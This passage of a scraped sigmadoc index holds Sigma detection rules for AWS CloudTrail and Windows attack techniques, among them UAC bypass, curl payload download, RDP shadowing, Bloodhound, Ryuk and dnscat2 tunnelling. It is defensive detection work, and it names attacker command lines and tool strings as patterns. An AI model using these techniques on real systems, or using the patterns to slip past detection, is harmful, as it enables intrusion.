service: cloudtrail detection: selection_source: eventSource: iam.amazonaws.com eventName: CreateAccessKey filter: userIdentity.arn|contains: responseElements.accessKey.userName condition: selection_source and not filter fields: - userIdentity.arn - responseElements.accessKey.userName - errorCode - errorMessage falsepositives: - Adding user keys to their own accounts (the filter cannot cover all possible variants of user naming) - AWS API keys legitimate exchange workflows level: medium tags: - attack.persistence - attack.t1098 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_iam_backdoor_users_keys.yml/","tags":["attack.persistence","attack.t1098"],"title":"AWS IAM Backdoor Users Keys"},{"categories":null,"contents":"Detects the change of database master password. It may be a part of data exfiltration.\nKnown false-positives Benign changes to a db instance References https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/rds__explore_snapshots/main.py Raw rule (edit) title: AWS RDS Master Password Change id: 8a63cdd4-6207-414a-85bc-7e032bd3c1a2 status: experimental description: Detects the change of database master password. It may be a part of data exfiltration. author: faloker date: 2020/02/12 modified: 2021/08/20 references: - https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/rds__explore_snapshots/main.py logsource: product: aws service: cloudtrail detection: selection_source: eventSource: rds.amazonaws.com responseElements.pendingModifiedValues.masterUserPassword: \u0026#39;*\u0026#39; eventName: ModifyDBInstance condition: selection_source falsepositives: - Benign changes to a db instance level: medium tags: - attack.exfiltration - attack.t1020 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_rds_change_master_password.yml/","tags":["attack.exfiltration","attack.t1020"],"title":"AWS RDS Master Password Change"},{"categories":null,"contents":"Detects the recovery of a new public database instance from a snapshot. It may be a part of data exfiltration.\nKnown false-positives unknown References https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/rds__explore_snapshots/main.py Raw rule (edit) title: Restore Public AWS RDS Instance id: c3f265c7-ff03-4056-8ab2-d486227b4599 status: experimental description: Detects the recovery of a new public database instance from a snapshot. It may be a part of data exfiltration. author: faloker date: 2020/02/12 modified: 2021/08/20 references: - https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/rds__explore_snapshots/main.py logsource: product: aws service: cloudtrail detection: selection_source: eventSource: rds.amazonaws.com responseElements.publiclyAccessible: \u0026#39;true\u0026#39; eventName: RestoreDBInstanceFromDBSnapshot condition: selection_source falsepositives: - unknown level: high tags: - attack.exfiltration - attack.t1020 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_rds_public_db_restore.yml/","tags":["attack.exfiltration","attack.t1020"],"title":"Restore Public AWS RDS Instance"},{"categories":null,"contents":"Detects updates of the GuardDuty list of trusted IPs, perhaps to disable security alerts against malicious IPs.\nKnown false-positives Valid change in the GuardDuty (e.g. to ignore internal scanners) References https://github.com/RhinoSecurityLabs/pacu/blob/master/modules/guardduty__whitelist_ip/main.py#L9 Raw rule (edit) title: AWS GuardDuty Important Change id: 6e61ee20-ce00-4f8d-8aee-bedd8216f7e3 status: experimental description: Detects updates of the GuardDuty list of trusted IPs, perhaps to disable security alerts against malicious IPs. author: faloker date: 2020/02/11 modified: 2021/08/09 references: - https://github.com/RhinoSecurityLabs/pacu/blob/master/modules/guardduty__whitelist_ip/main.py#L9 logsource: product: aws service: cloudtrail detection: selection_source: eventSource: guardduty.amazonaws.com eventName: CreateIPSet condition: selection_source falsepositives: - Valid change in the GuardDuty (e.g. to ignore internal scanners) level: high tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_guardduty_disruption.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"AWS GuardDuty Important Change"},{"categories":null,"contents":"Detects bulk downloading of User Data associated with AWS EC2 instances. Instance User Data may include installation scripts and hard-coded secrets for deployment.\nKnown false-positives Assets management software like device42 References https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/ec2__download_userdata/main.py Raw rule (edit) title: AWS EC2 Download Userdata id: 26ff4080-194e-47e7-9889-ef7602efed0c status: experimental description: Detects bulk downloading of User Data associated with AWS EC2 instances. Instance User Data may include installation scripts and hard-coded secrets for deployment. author: faloker date: 2020/02/11 modified: 2021/08/20 references: - https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/ec2__download_userdata/main.py logsource: product: aws service: cloudtrail detection: selection_source: eventSource: ec2.amazonaws.com requestParameters.attribute: userData eventName: DescribeInstanceAttribute timeframe: 30m condition: selection_source | count() \u0026gt; 10 falsepositives: - Assets management software like device42 level: medium tags: - attack.exfiltration - attack.t1020 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_ec2_download_userdata.yml/","tags":["attack.exfiltration","attack.t1020"],"title":"AWS EC2 Download Userdata"},{"categories":null,"contents":"Detects a method that uses Wsreset.exe tool that can be used to reset the Windows Store to bypass UAC\nKnown false-positives Unknown sub processes of Wsreset.exe References https://lolbas-project.github.io/lolbas/Binaries/Wsreset/ https://www.activecyber.us/activelabs/windows-uac-bypass https://twitter.com/ReaQta/status/1222548288731217921 Raw rule (edit) title: Wsreset UAC Bypass id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae status: test description: Detects a method that uses Wsreset.exe tool that can be used to reset the Windows Store to bypass UAC author: Florian Roth references: - https://lolbas-project.github.io/lolbas/Binaries/Wsreset/ - https://www.activecyber.us/activelabs/windows-uac-bypass - https://twitter.com/ReaQta/status/1222548288731217921 date: 2020/01/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - \u0026#39;\\WSreset.exe\u0026#39; condition: selection fields: - CommandLine falsepositives: - Unknown sub processes of Wsreset.exe level: high tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_wsreset_uac_bypass.yml/","tags":["attack.privilege_escalation","attack.defense_evasion","attack.t1548.002"],"title":"Wsreset UAC Bypass"},{"categories":null,"contents":"Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.\nKnown false-positives Administrative scripts (installers) References https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983 Raw rule (edit) title: Curl Start Combination id: 21dd6d38-2b18-4453-9404-a0fe4a0cc288 status: test description: Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later. author: Sreeman references: - https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983 date: 2020/01/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: condition: selection selection: CommandLine|contains|all: - \u0026#39;curl\u0026#39; - \u0026#39; start \u0026#39; fields: - ParentImage - CommandLine falsepositives: - Administrative scripts (installers) level: medium tags: - attack.execution - attack.t1218 - attack.command_and_control - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_curl_start_combo.yml/","tags":["attack.execution","attack.t1218","attack.command_and_control","attack.t1105"],"title":"Curl Start Combination"},{"categories":null,"contents":"Detects suspicious FromBase64String expressions in command line arguments\nKnown false-positives Administrative script libraries References https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639 Raw rule (edit) title: FromBase64String Command Line id: e32d4572-9826-4738-b651-95fa63747e8a status: test description: Detects suspicious FromBase64String expressions in command line arguments author: Florian Roth references: - https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639 date: 2020/01/29 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: \u0026#39;::FromBase64String(\u0026#39; condition: selection falsepositives: - Administrative script libraries level: high tags: - attack.t1027 - attack.defense_evasion - attack.t1140 - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_frombase64string.yml/","tags":["attack.t1027","attack.defense_evasion","attack.t1140","attack.t1059.001"],"title":"FromBase64String Command Line"},{"categories":null,"contents":"Detects a renamed dctask64.exe used for process injection, command execution, process creation with a signed binary by ZOHO Corporation\nKnown false-positives Unknown yet References https://twitter.com/gN3mes1s/status/1222088214581825540 https://twitter.com/gN3mes1s/status/1222095963789111296 https://twitter.com/gN3mes1s/status/1222095371175911424 Raw rule (edit) title: Renamed ZOHO Dctask64 id: 340a090b-c4e9-412e-bb36-b4b16fe96f9b status: test description: Detects a renamed dctask64.exe used for process injection, command execution, process creation with a signed binary by ZOHO Corporation author: Florian Roth references: - https://twitter.com/gN3mes1s/status/1222088214581825540 - https://twitter.com/gN3mes1s/status/1222095963789111296 - https://twitter.com/gN3mes1s/status/1222095371175911424 date: 2020/01/28 modified: 2021/12/08 logsource: category: process_creation product: windows detection: selection: Hashes|contains: \u0026#39;6834B1B94E49701D77CCB3C0895E1AFD\u0026#39; filter: Image|endswith: \u0026#39;\\dctask64.exe\u0026#39; condition: selection and not filter fields: - CommandLine - ParentCommandLine - ParentImage falsepositives: - Unknown yet level: high tags: - attack.defense_evasion - attack.t1036 - attack.t1055.001 - attack.t1202 - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_renamed_dctask64.yml/","tags":["attack.defense_evasion","attack.t1036","attack.t1055.001","attack.t1202","attack.t1218"],"title":"Renamed ZOHO Dctask64"},{"categories":null,"contents":"Detects suspicious process injection using ZOHO\u0026rsquo;s dctask64.exe\nKnown false-positives Unknown yet References https://twitter.com/gN3mes1s/status/1222088214581825540 https://twitter.com/gN3mes1s/status/1222095963789111296 https://twitter.com/gN3mes1s/status/1222095371175911424 Raw rule (edit) title: ZOHO Dctask64 Process Injection id: 6345b048-8441-43a7-9bed-541133633d7a status: test description: Detects suspicious process injection using ZOHO\u0026#39;s dctask64.exe author: Florian Roth references: - https://twitter.com/gN3mes1s/status/1222088214581825540 - https://twitter.com/gN3mes1s/status/1222095963789111296 - https://twitter.com/gN3mes1s/status/1222095371175911424 date: 2020/01/28 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\dctask64.exe\u0026#39; filter: CommandLine|contains: - \u0026#39;DesktopCentral_Agent\\agent\u0026#39; condition: selection and not filter fields: - CommandLine - ParentCommandLine - ParentImage falsepositives: - Unknown yet level: high tags: - attack.defense_evasion - attack.t1055.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_dctask64_proc_inject.yml/","tags":["attack.defense_evasion","attack.t1055.001"],"title":"ZOHO Dctask64 Process Injection"},{"categories":null,"contents":"Detects RDP session hijacking by using MSTSC shadowing\nKnown false-positives Unknown References https://twitter.com/kmkz_security/status/1220694202301976576 https://github.com/kmkz/Pentesting/blob/master/Post-Exploitation-Cheat-Sheet Raw rule (edit) title: MSTSC Shadowing id: 6ba5a05f-b095-4f0a-8654-b825f4f16334 status: test description: Detects RDP session hijacking by using MSTSC shadowing author: Florian Roth references: - https://twitter.com/kmkz_security/status/1220694202301976576 - https://github.com/kmkz/Pentesting/blob/master/Post-Exploitation-Cheat-Sheet date: 2020/01/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;noconsentprompt\u0026#39; - \u0026#39;shadow:\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1563.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_rdp_hijack_shadowing.yml/","tags":["attack.lateral_movement","attack.t1563.002"],"title":"MSTSC Shadowing"},{"categories":null,"contents":"Detects AWS root account usage\nKnown false-positives AWS Tasks That Require AWS Account Root User Credentials https://docs.aws.amazon.com/general/latest/gr/aws_tasks-that-require-root.html References https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html Raw rule (edit) title: AWS Root Credentials id: 8ad1600d-e9dc-4251-b0ee-a65268f29add status: experimental description: Detects AWS root account usage author: vitaliy0x1 date: 2020/01/21 modified: 2021/08/09 references: - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html logsource: product: aws service: cloudtrail detection: selection_usertype: userIdentity.type: Root selection_eventtype: eventType: AwsServiceEvent condition: selection_usertype and not selection_eventtype falsepositives: - AWS Tasks That Require AWS Account Root User Credentials https://docs.aws.amazon.com/general/latest/gr/aws_tasks-that-require-root.html level: medium tags: - attack.privilege_escalation - attack.t1078.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_root_account_usage.yml/","tags":["attack.privilege_escalation","attack.t1078.004"],"title":"AWS Root Credentials"},{"categories":null,"contents":"Detects AWS Config Service disabling\nKnown false-positives Valid change in AWS Config Service Raw rule (edit) title: AWS Config Disabling Channel/Recorder id: 07330162-dba1-4746-8121-a9647d49d297 status: experimental description: Detects AWS Config Service disabling author: vitaliy0x1 date: 2020/01/21 modified: 2021/08/09 logsource: product: aws service: cloudtrail detection: selection_source: eventSource: config.amazonaws.com eventName: - DeleteDeliveryChannel - StopConfigurationRecorder condition: selection_source falsepositives: - Valid change in AWS Config Service level: high tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_config_disable_recording.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"AWS Config Disabling Channel/Recorder"},{"categories":null,"contents":"Detects disabling, deleting and updating of a Trail\nKnown false-positives Valid change in a Trail References https://docs.aws.amazon.com/awscloudtrail/latest/userguide/best-practices-security.html Raw rule (edit) title: AWS CloudTrail Important Change id: 4db60cc0-36fb-42b7-9b58-a5b53019fb74 status: experimental description: Detects disabling, deleting and updating of a Trail author: vitaliy0x1 date: 2020/01/21 modified: 2021/08/09 references: - https://docs.aws.amazon.com/awscloudtrail/latest/userguide/best-practices-security.html logsource: product: aws service: cloudtrail detection: selection_source: eventSource: cloudtrail.amazonaws.com eventName: - StopLogging - UpdateTrail - DeleteTrail condition: selection_source falsepositives: - Valid change in a Trail level: medium tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_cloudtrail_disable_logging.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"AWS CloudTrail Important Change"},{"categories":null,"contents":"Detects events generated by Windows to indicate the exploitation of a known vulnerability (e.g. CVE-2020-0601)\nKnown false-positives Unknown References https://twitter.com/mattifestation/status/1217179698008068096 https://twitter.com/VM_vivisector/status/1217190929330655232 https://twitter.com/davisrichardg/status/1217517547576348673 https://twitter.com/DidierStevens/status/1217533958096924676 https://twitter.com/FlemmingRiis/status/1217147415482060800 Raw rule (edit) title: Audit CVE Event id: 48d91a3a-2363-43ba-a456-ca71ac3da5c2 status: experimental description: Detects events generated by Windows to indicate the exploitation of a known vulnerability (e.g. CVE-2020-0601) references: - https://twitter.com/mattifestation/status/1217179698008068096 - https://twitter.com/VM_vivisector/status/1217190929330655232 - https://twitter.com/davisrichardg/status/1217517547576348673 - https://twitter.com/DidierStevens/status/1217533958096924676 - https://twitter.com/FlemmingRiis/status/1217147415482060800 tags: - attack.execution - attack.t1203 - attack.privilege_escalation - attack.t1068 - attack.defense_evasion - attack.t1211 - attack.credential_access - attack.t1212 - attack.lateral_movement - attack.t1210 - attack.impact - attack.t1499.004 author: Florian Roth date: 2020/01/15 modified: 2021/10/13 logsource: product: windows service: application detection: selection: Provider_Name: \u0026#39;Microsoft-Windows-Audit-CVE\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/application/win_audit_cve.yml/","tags":["attack.execution","attack.t1203","attack.privilege_escalation","attack.t1068","attack.defense_evasion","attack.t1211","attack.credential_access","attack.t1212","attack.lateral_movement","attack.t1210","attack.impact","attack.t1499.004"],"title":"Audit CVE Event"},{"categories":null,"contents":"The Tasks folder in system32 and syswow64 are globally writable paths. Adversaries can take advantage of this and load or influence any script hosts or ANY .NET Application in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr\nKnown false-positives Unknown References https://twitter.com/subTee/status/1216465628946563073 https://gist.github.com/am0nsec/8378da08f848424e4ab0cc5b317fdd26 Raw rule (edit) title: Tasks Folder Evasion id: cc4e02ba-9c06-48e2-b09e-2500cace9ae0 status: experimental description: The Tasks folder in system32 and syswow64 are globally writable paths. Adversaries can take advantage of this and load or influence any script hosts or ANY .NET Application in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr references: - https://twitter.com/subTee/status/1216465628946563073 - https://gist.github.com/am0nsec/8378da08f848424e4ab0cc5b317fdd26 date: 2020/01/13 modified: 2021/11/06 author: Sreeman tags: - attack.defense_evasion - attack.persistence - attack.execution - attack.t1574.002 logsource: product: windows category: process_creation detection: selection1: CommandLine|contains: - \u0026#39;echo \u0026#39; - \u0026#39;copy \u0026#39; - \u0026#39;type \u0026#39; - \u0026#39;file createnew\u0026#39; selection2: CommandLine|contains: - \u0026#39; C:\\Windows\\System32\\Tasks\\\u0026#39; - \u0026#39; C:\\Windows\\SysWow64\\Tasks\\\u0026#39; condition: selection1 and selection2 fields: - CommandLine - ParentProcess falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_task_folder_evasion.yml/","tags":["attack.defense_evasion","attack.persistence","attack.execution","attack.t1574.002"],"title":"Tasks Folder Evasion"},{"categories":null,"contents":"Detects the use of Windows Credential Editor (WCE)\nKnown false-positives Unknown References https://www.ampliasecurity.com/research/windows-credentials-editor/ Raw rule (edit) title: Windows Credential Editor Registry id: a6b33c02-8305-488f-8585-03cb2a7763f2 status: test description: Detects the use of Windows Credential Editor (WCE) author: Florian Roth references: - https://www.ampliasecurity.com/research/windows-credentials-editor/ date: 2019/12/31 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|contains: Services\\WCESERVICE\\Start condition: selection falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1003.001 - attack.s0005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_hack_wce_reg.yml/","tags":["attack.credential_access","attack.t1003.001","attack.s0005"],"title":"Windows Credential Editor Registry"},{"categories":null,"contents":"Detects a suspicious copy command to or from an Admin share\nKnown false-positives Administrative scripts References https://twitter.com/SBousseaden/status/1211636381086339073 https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view Raw rule (edit) title: Copy from Admin Share id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900 status: test description: Detects a suspicious copy command to or from an Admin share author: \u0026#39;Florian Roth, oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st\u0026#39; references: - https://twitter.com/SBousseaden/status/1211636381086339073 - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view date: 2019/12/30 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - \u0026#39;\\robocopy.exe\u0026#39; - \u0026#39;\\xcopy.exe\u0026#39; selection2: Image|endswith: \u0026#39;\\cmd.exe\u0026#39; CommandLine|contains: \u0026#39;copy\u0026#39; selection3: Image|contains: \u0026#39;\\powershell\u0026#39; CommandLine|contains: - \u0026#39;copy-item\u0026#39; - \u0026#39;copy\u0026#39; - \u0026#39;cpi \u0026#39; - \u0026#39; cp \u0026#39; selection4: CommandLine|contains|all: - \u0026#39;\\\\\\\\\u0026#39; - \u0026#39;$\u0026#39; condition: (selection1 or selection2 or selection3) and selection4 fields: - CommandLine - ParentCommandLine falsepositives: - Administrative scripts level: high tags: - attack.lateral_movement - attack.collection - attack.exfiltration - attack.t1039 - attack.t1048 - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_copy_lateral_movement.yml/","tags":["attack.lateral_movement","attack.collection","attack.exfiltration","attack.t1039","attack.t1048","attack.t1021.002"],"title":"Copy from Admin Share"},{"categories":null,"contents":"Detects the execution of SecurityXploded Tools\nKnown false-positives unlikely References https://securityxploded.com/ https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/ Raw rule (edit) title: SecurityXploded Tool id: 7679d464-4f74-45e2-9e01-ac66c5eb041a description: Detects the execution of SecurityXploded Tools status: experimental author: Florian Roth references: - https://securityxploded.com/ - https://cyberx-labs.com/blog/gangnam-industrial-style-apt-campaign-targets-korean-industrial-companies/ date: 2018/12/19 modified: 2021/05/11 tags: - attack.credential_access - attack.t1555 logsource: category: process_creation product: windows detection: selection1: Company: SecurityXploded selection2: Image|endswith: \u0026#39;PasswordDump.exe\u0026#39; selection3: OriginalFileName|endswith: \u0026#39;PasswordDump.exe\u0026#39; condition: 1 of selection* falsepositives: - unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hack_secutyxploded.yml/","tags":["attack.credential_access","attack.t1555"],"title":"SecurityXploded Tool"},{"categories":null,"contents":"Detects DLL\u0026rsquo;s Loaded Via Word Containing VBA Macros Executing WMI Commands\nKnown false-positives Possible. Requires further testing. References https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 https://www.carbonblack.com/2019/04/24/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/ https://media.cert.europa.eu/static/SecurityAdvisories/2019/CERT-EU-SA2019-021.pdf Raw rule (edit) title: Windows Management Instrumentation DLL Loaded Via Microsoft Word id: a457f232-7df9-491d-898f-b5aabd2cbe2f status: deprecated description: Detects DLL\u0026#39;s Loaded Via Word Containing VBA Macros Executing WMI Commands references: - https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16 - https://www.carbonblack.com/2019/04/24/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/ - https://media.cert.europa.eu/static/SecurityAdvisories/2019/CERT-EU-SA2019-021.pdf author: Michael R. (@nahamike01) date: 2019/12/26 modified: 2021/11/22 tags: - attack.execution - attack.t1047 logsource: category: image_load product: windows detection: selection: Image|endswith: - \u0026#39;\\winword.exe\u0026#39; - \u0026#39;\\powerpnt.exe\u0026#39; - \u0026#39;\\excel.exe\u0026#39; - \u0026#39;\\outlook.exe\u0026#39; ImageLoaded|endswith: - \u0026#39;\\wmiutils.dll\u0026#39; - \u0026#39;\\wbemcomn.dll\u0026#39; - \u0026#39;\\wbemprox.dll\u0026#39; - \u0026#39;\\wbemdisp.dll\u0026#39; # - \u0026#39;\\wbemsvc.dll\u0026#39; # too many FPs, tested with Win11 and O365 condition: selection falsepositives: - Possible. Requires further testing. level: informational ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_winword_wmidll_load.yml/","tags":["attack.execution","attack.t1047"],"title":"Windows Management Instrumentation DLL Loaded Via Microsoft Word"},{"categories":null,"contents":"Trickbot enumerates domain/network topology and executes certain commands automatically every few minutes. This detectors attempts to identify that activity based off a command rarely observed in an enterprise network.\nKnown false-positives Rare System Admin Activity References https://www.sneakymonkey.net/2019/05/22/trickbot-analysis/ https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/ Raw rule (edit) title: Trickbot Malware Recon Activity id: 410ad193-a728-4107-bc79-4419789fcbf8 status: test description: Trickbot enumerates domain/network topology and executes certain commands automatically every few minutes. This detectors attempts to identify that activity based off a command rarely observed in an enterprise network. author: David Burkett, Florian Roth references: - https://www.sneakymonkey.net/2019/05/22/trickbot-analysis/ - https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/ date: 2019/12/28 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - \u0026#39;\\cmd.exe\u0026#39; Image|endswith: - \u0026#39;\\nltest.exe\u0026#39; CommandLine|contains: - \u0026#39;/domain_trusts /all_trusts\u0026#39; condition: selection falsepositives: - Rare System Admin Activity level: critical tags: - attack.discovery - attack.t1482 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_trickbot_recon_activity.yml/","tags":["attack.discovery","attack.t1482"],"title":"Trickbot Malware Recon Activity"},{"categories":null,"contents":"Detects activity mentioned in Operation Wocao report\nKnown false-positives Administrators that use checkadmin.exe tool to enumerate local administrators References https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/ https://twitter.com/SBousseaden/status/1207671369963646976 Raw rule (edit) title: Operation Wocao Activity id: 74ad4314-482e-4c3e-b237-3f7ed3b9ca8d author: Florian Roth, frack113 status: experimental description: Detects activity mentioned in Operation Wocao report references: - https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/ - https://twitter.com/SBousseaden/status/1207671369963646976 tags: - attack.discovery - attack.t1012 - attack.defense_evasion - attack.t1036.004 - attack.t1027 - attack.execution - attack.t1053.005 - attack.t1059.001 date: 2019/12/20 modified: 2021/09/19 logsource: product: windows service: security detection: selection: EventID: 4799 TargetUserName|startswith: \u0026#39;Administr\u0026#39; CallerProcessName|endswith: \u0026#39;\\checkadmin.exe\u0026#39; condition: selection falsepositives: - Administrators that use checkadmin.exe tool to enumerate local administrators level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_apt_wocao.yml/","tags":["attack.discovery","attack.t1012","attack.defense_evasion","attack.t1036.004","attack.t1027","attack.execution","attack.t1053.005","attack.t1059.001"],"title":"Operation Wocao Activity"},{"categories":null,"contents":"Detects command line parameters used by Bloodhound and Sharphound hack tools\nKnown false-positives Other programs that use these command line option and accepts an \u0026lsquo;All\u0026rsquo; parameter References https://github.com/BloodHoundAD/BloodHound https://github.com/BloodHoundAD/SharpHound Raw rule (edit) title: Bloodhound and Sharphound Hack Tool id: f376c8a7-a2d0-4ddc-aa0c-16c17236d962 status: test description: Detects command line parameters used by Bloodhound and Sharphound hack tools author: Florian Roth references: - https://github.com/BloodHoundAD/BloodHound - https://github.com/BloodHoundAD/SharpHound date: 2019/12/20 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|contains: - \u0026#39;\\Bloodhound.exe\u0026#39; - \u0026#39;\\SharpHound.exe\u0026#39; selection2: CommandLine|contains: - \u0026#39; -CollectionMethod All \u0026#39; - \u0026#39;.exe -c All -d \u0026#39; - \u0026#39;Invoke-Bloodhound\u0026#39; - \u0026#39;Get-BloodHoundData\u0026#39; selection3: CommandLine|contains|all: - \u0026#39; -JsonFolder \u0026#39; - \u0026#39; -ZipFileName \u0026#39; selection4: CommandLine|contains|all: - \u0026#39; DCOnly \u0026#39; - \u0026#39; --NoSaveCache \u0026#39; condition: 1 of selection* falsepositives: - Other programs that use these command line option and accepts an \u0026#39;All\u0026#39; parameter level: high tags: - attack.discovery - attack.t1087.001 - attack.t1087.002 - attack.t1482 - attack.t1069.001 - attack.t1069.002 - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hack_bloodhound.yml/","tags":["attack.discovery","attack.t1087.001","attack.t1087.002","attack.t1482","attack.t1069.001","attack.t1069.002","attack.execution","attack.t1059.001"],"title":"Bloodhound and Sharphound Hack Tool"},{"categories":null,"contents":"Detects Ryuk ransomware activity\nKnown false-positives Unlikely References https://app.any.run/tasks/d860402c-3ff4-4c1f-b367-0237da714ed1/ Raw rule (edit) title: Ryuk Ransomware id: c37510b8-2107-4b78-aa32-72f251e7a844 status: test description: Detects Ryuk ransomware activity author: Florian Roth references: - https://app.any.run/tasks/d860402c-3ff4-4c1f-b367-0237da714ed1/ date: 2019/12/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;Microsoft\\Windows\\CurrentVersion\\Run\u0026#39; - \u0026#39;C:\\users\\Public\\\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: critical tags: - attack.persistence - attack.t1547.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_ryuk.yml/","tags":["attack.persistence","attack.t1547.001"],"title":"Ryuk Ransomware"},{"categories":null,"contents":"Detects Silence empireDNSagent\nKnown false-positives Unknown Raw rule (edit) title: Silence.EDA Detection id: 3ceb2083-a27f-449a-be33-14ec1b7cc973 status: test description: Detects Silence empireDNSagent author: Alina Stepchenkova, Group-IB, oscd.community date: 2019/11/01 modified: 2021/11/27 logsource: product: windows service: powershell detection: empire: ScriptBlockText|contains|all: # better to randomise the order - \u0026#39;System.Diagnostics.Process\u0026#39; - \u0026#39;Stop-Computer\u0026#39; - \u0026#39;Restart-Computer\u0026#39; - \u0026#39;Exception in execution\u0026#39; - \u0026#39;$cmdargs\u0026#39; - \u0026#39;Close-Dnscat2Tunnel\u0026#39; dnscat: ScriptBlockText|contains|all: # better to randomise the order - \u0026#39;set type=$LookupType`nserver\u0026#39; - \u0026#39;$Command | nslookup 2\u0026gt;\u0026amp;1 | Out-String\u0026#39; - \u0026#39;New-RandomDNSField\u0026#39; - \u0026#39;[Convert]::ToString($SYNOptions, 16)\u0026#39; - \u0026#39;$Session.Dead = $True\u0026#39; - \u0026#39;$Session[\u0026#34;Driver\u0026#34;] -eq\u0026#39; condition: empire and dnscat falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1059.001 - attack.command_and_control - attack.t1071.004 - attack.t1572 - attack.impact - attack.t1529 - attack.g0091 - attack.s0363 